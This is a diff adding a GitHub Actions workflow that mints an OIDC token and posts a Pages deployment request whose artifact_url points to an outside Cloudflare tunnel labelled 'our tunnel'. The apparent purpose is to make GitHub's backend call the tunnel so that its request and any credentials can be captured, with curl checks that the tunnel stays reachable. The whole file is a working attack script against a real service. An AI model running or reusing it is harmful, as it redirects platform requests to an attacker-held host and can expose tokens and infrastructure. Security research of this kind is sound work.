@@ -1,0 +1,36 @@
+name: bf45db64-capture
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+  actions: read
+jobs:
+  capture:
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+    steps:
+      - name: capture-arm
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TUNNEL: "https://liberty-jvc-fairfield-blocks.trycloudflare.com"
+        run: |
+          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+          echo "::add-mask::$TOKEN"
+          API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
+          
+          echo "===== CONTROL: tunnel reachable ====="
+          curl -s "$TUNNEL/control-pre-capture" || true
+          
+          echo "===== ARM: artifact_id (expired) + artifact_url (our tunnel) ====="
+          curl -s -w '\nHTTP %{http_code}\n' -X POST "$API" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -d "{\"artifact_id\":\"10387063794\",\"artifact_url\":\"$TUNNEL/bf45db64-capture/_apis/pipelines/1/runs/1/artifacts?artifactName=github-pages\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
+          
+          sleep 30
+          
+          echo "===== CONTROL: tunnel still alive ====="
+          curl -s "$TUNNEL/control-post-capture" || true
